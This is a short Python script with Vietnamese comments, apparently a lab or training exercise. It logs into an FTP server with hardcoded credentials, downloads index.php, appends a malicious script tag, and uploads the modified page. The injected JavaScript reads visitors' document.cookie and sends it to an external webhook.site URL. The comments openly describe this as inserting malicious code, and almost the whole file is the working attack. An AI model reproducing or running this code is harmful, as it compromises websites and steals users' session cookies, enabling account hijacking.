import ftplib
#Thư viện này cung cấp các chức năng để tạo và tương tác với một kết nối FTP.
def injectPage(ftp:ftplib.FTP, page, redirect):
    #HàminjectPage nhận ba tham số:
    #ftp: Một đối tượng FTP từ thư viện ftplib, được sử dụng để thực hiện các thao tác FTP.
    #page: Tên của trang cần bị chèn mã độc hại.
    #redirect: Mã độc hại mà sẽ được chèn vào trang.
    temp_filename = page + '.tmp'
    #ạo một tên tệp tạm thời bằng cách thêm phần mở rộng .tmp vào tên trang.
    with open(temp_filename, 'wb') as temp_file:
        #Mở tệp tạm thời trong chế độ ghi nhị phân để tải trang web cần sửa đổi từ máy chủ FTP về.
        ftp.retrbinary('RETR ' + page, temp_file.write)
        #Thực hiện thao tác FTP để tải nội dung của trang web từ máy chủ FTP và ghi vào tệp tạm thời.
    print("[+] Download page: " + page)
    #In ra thông báo cho biết trang web đã được tải về thành công.
    redirect_bytes = redirect.encode('utf-8')
    #Chuyển đổi chuỗi redirect thành dạng bytes để có thể ghi vào tệp.
    with open(temp_filename, 'ab') as temp_file:
        #Mở tệp tạm thời trong chế độ ghi nhị phân để ghi mã độc hại vào cuối trang web.
        temp_file.write(redirect_bytes)
    #Ghi mã độc hại vào tệp tạm thời.
    print('[+] Inject Malicious Iframe on: ' + page)
    # In ra thông báo cho biết đã chèn mã độc hại vào trang web thành công.
    with open(temp_filename, 'rb') as temp_file:
        #Mở tệp tạm thời trong chế độ đọc nhị phân để tải nội dung đã sửa đổi từ tệp.
        ftp.storbinary("STOR " + page, temp_file)
        #Thực hiện thao tác FTP để tải tệp tạm thời, chứa trang web đã sửa đổi, lên máy chủ FTP.
    print("[+] Upload inject page: " + page)
    #In ra thông báo cho biết trang web đã được tải lên máy chủ FTP thành công.

host = '192.168.255.130' #IP máy chủ FTP
port = 21 #cổng
username = 'client1' #tài khoản và mật khẩu người dùng
pwd = 'client1'

#Thực hiện một loạt các thao tác FTP để thực hiện việc chèn mã độc hại vào một trang web cụ thể
try:
    ftp=ftplib.FTP_TLS(timeout = 30) #Tạo một đối tượng FTP_TLS từ thư viện ftplib, sử dụng giao thức FTP bảo mật.
    ftp.connect(host, port) #Kết nối đến máy chủ FTP thông qua địa chỉ host và cổng port.
    ftp.auth()#xác thực với FTP
    print(f"Connected to {host}")
    ftp.login(username,pwd) #Đăng nhập vào máy chủ FTP với tên người dùng và mật khẩu được cung cấp
    ftp.prot_p() #Bảo vệ kết nối bằng cách sử dụng giao thức SSL/TLS.
except Exception as e:
    print(e) #In ra thông báo lỗi cho biết lỗi cụ thể nếu có lỗi xảy ra.

ftp.cwd("/opt/lampp/htdocs/includes/") #Thay đổi thư mục làm việc của FTP đến thư mục chứa trang web cần sửa đổi.
redirect = "<script>const cookies = document.cookie;const url = `https://webhook.site/ca18b48e-99ba-43e0-8376-d3261af9e983?${cookies}`;fetch(url, {method: 'GET'}).then(response => {}).catch(error =>{});</script>"
#Định nghĩa một biến redirect chứa mã JavaScript độc hại mà bạn muốn chèn vào trang web.
injectPage(ftp,'index.php',redirect)
#Gọi hàm injectPage để thực hiện việc chèn mã độc hại vào trang web 'index.php'.
# Hàm này đã được định nghĩa trước đó trong mã và được truyền đối tượng FTP, tên trang và mã độc hại như các tham số.
